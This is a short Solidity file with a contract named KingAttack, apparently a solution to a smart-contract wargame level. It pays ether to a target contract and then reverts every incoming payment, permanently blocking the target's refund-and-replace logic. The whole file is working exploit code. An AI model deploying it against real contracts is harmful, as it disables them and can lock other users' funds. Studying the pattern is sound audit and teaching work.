// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract KingAttack {
    constructor(address payable target) payable {
        (bool success, ) = target.call{value: msg.value}("");
        require(success);
    }

    receive() external payable {
        revert();
    }
}
